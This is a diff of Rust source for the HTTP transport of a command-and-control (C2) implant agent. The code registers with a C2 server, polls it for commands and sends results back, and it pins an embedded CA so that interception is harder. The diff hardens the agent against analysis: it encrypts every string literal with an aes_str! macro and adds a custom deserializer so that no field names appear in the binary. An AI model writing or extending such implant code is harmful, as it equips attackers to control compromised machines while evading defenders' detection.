@@ -31,7 +31,7 @@ pub fn build_client(config: &C2Config) -> Result<Client, String> {
     // intercepting C2 traffic, even with self-signed infrastructure.
     let ca_pem = include_bytes!("../../certs/ca.crt");
     let ca_cert = reqwest::Certificate::from_pem(ca_pem)
-        .map_err(|e| format!("Failed to parse embedded CA cert: {}", e))?;
+        .map_err(|e| format!("{} {}", aes_str!("Failed to parse embedded CA cert:"), e))?;
 
     // Timeouts from the typed agent config (defaults: 120 s request,
     // 15 s connect). The 120 s request timeout keeps large file-transfer
@@ -54,7 +54,7 @@ pub fn build_client(config: &C2Config) -> Result<Client, String> {
     let proxy = &config.proxy;
     if !proxy.url.is_empty() {
         // Explicit proxy
-        let mut p = Proxy::all(&proxy.url).map_err(|e| format!("Proxy URL: {}", e))?;
+        let mut p = Proxy::all(&proxy.url).map_err(|e| format!("{} {}", aes_str!("Proxy URL:"), e))?;
         if !proxy.username.is_empty() {
             p = p.basic_auth(&proxy.username, &proxy.password);
         }
@@ -65,7 +65,7 @@ pub fn build_client(config: &C2Config) -> Result<Client, String> {
     }
     // If use_system is true and url is empty, reqwest uses system proxy by default
 
-    builder.build().map_err(|e| format!("HTTP client: {}", e))
+    builder.build().map_err(|e| format!("{} {}", aes_str!("HTTP client:"), e))
 }
 
 /// The base URL for the C2 server.
@@ -80,25 +80,43 @@ pub fn base_url(config: &C2Config) -> String {
 
 /// Register with the C2 server. Returns the session token.
 pub async fn register(client: &Client, base: &str, hello: &ClientHello) -> Result<(String, Vec<SecuredCommand>), String> {
-    let url = format!("{}/register", base);
+    let url = format!("{}{}", base, aes_str!("/register"));
     let resp = client.post(&url)
         .json(hello)
         .send()
         .await
-        .map_err(|e| format!("Register: {}", e))?;
+        .map_err(|e| format!("{} {}", aes_str!("Register:"), e))?;
 
     if !resp.status().is_success() {
-        return Err(format!("Register failed: HTTP {}", resp.status()));
+        return Err(format!("{} {}", aes_str!("Register failed: HTTP"), resp.status()));
     }
 
-    #[derive(Deserialize)]
+    // Mirrors the server-side registration response in
+    // src/server/http_listener.rs. Manual seq impl (positional
+    // [token, commands]) so no field names leak into the agent binary.
     struct RegisterResponse {
         token: String,
-        #[serde(default)]
         commands: Vec<SecuredCommand>,
     }
 
-    let data: RegisterResponse = resp.json().await.map_err(|e| format!("Parse: {}", e))?;
+    impl<'de> Deserialize<'de> for RegisterResponse {
+        fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
+            struct V;
+            impl<'de> serde::de::Visitor<'de> for V {
+                type Value = RegisterResponse;
+                fn expecting(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result { f.write_str(aes_str!("seq").as_str()) }
+                fn visit_seq<A: serde::de::SeqAccess<'de>>(self, mut s: A) -> Result<Self::Value, A::Error> {
+                    Ok(RegisterResponse {
+                        token: s.next_element()?.ok_or_else(|| serde::de::Error::custom(aes_str!("truncated")))?,
+                        commands: s.next_element()?.unwrap_or_default(),
+                    })
+                }
+            }
+            deserializer.deserialize_seq(V)
+        }
+    }
+
+    let data: RegisterResponse = resp.json().await.map_err(|e| format!("{} {}", aes_str!("Parse:"), e))?;
     Ok((data.token, data.commands))
 }
 
@@ -109,19 +127,19 @@ pub async fn poll(client: &Client, base: &str, token: &str, profile_uri: &str) -
         .header(aes_str!("X-Session-Token"), token)
         .send()
         .await
-        .map_err(|e| format!("Poll: {}", e))?;
+        .map_err(|e| format!("{} {}", aes_str!("Poll:"), e))?;
 
     if !resp.status().is_success() {
-        return Err(format!("Poll: HTTP {}", resp.status()));
+        return Err(format!("{} {}", aes_str!("Poll: HTTP"), resp.status()));
     }
 
-    let body = resp.text().await.map_err(|e| format!("Body: {}", e))?;
+    let body = resp.text().await.map_err(|e| format!("{} {}", aes_str!("Body:"), e))?;
     if body.trim().is_empty() || body.contains(&aes_str!("\"data\":[]")) {
         return Ok(Vec::new());
     }
 
     serde_json::from_str::<Vec<SecuredCommand>>(&body)
-        .map_err(|e| format!("Parse commands: {}", e))
+        .map_err(|e| format!("{} {}", aes_str!("Parse commands:"), e))
 }
 
 /// Send a command response back to the server.
@@ -132,6 +150,6 @@ pub async fn send_result(client: &Client, base: &str, token: &str, resp: &Comman
         .json(resp)
         .send()
         .await
-        .map_err(|e| format!("Send result: {}", e))?;
+        .map_err(|e| format!("{} {}", aes_str!("Send result:"), e))?;
     Ok(())
 }
